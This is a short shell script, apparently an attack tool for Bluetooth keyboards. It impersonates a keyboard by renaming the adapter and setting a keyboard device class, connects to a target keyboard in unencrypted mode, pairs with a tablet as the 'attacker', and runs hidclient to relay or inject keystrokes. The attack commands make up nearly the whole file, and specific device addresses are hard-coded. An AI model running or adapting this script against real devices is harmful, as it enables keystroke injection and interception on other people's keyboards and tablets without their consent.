#!/bin/sh

# Teslecta BT-
# Keyboard BT-Address: 60:FB:42:12:07:38
# Tablet:  74:2F:68:AC:53:8F

#change name of device to keyboardsudo hciconfig hci0 name 'Device Name'
#go to /var/lib/bluetooth and change name KB-01
#sudo hciconfig hci0 name 'KB-01'
#sudo hciconfig hci0 class '0x000540'
#sudo /etc/init.d/bluetooth restart

#connect to keyboard using unencrypted mode
sudo hidd --connect 60:FB:42:12:07:38

#make attacker discoverable
sudo bt-device -c 74:2F:68:AC:53:8F

#run hidclient
sudo /usr/local/bin/hidclient -e8 -x
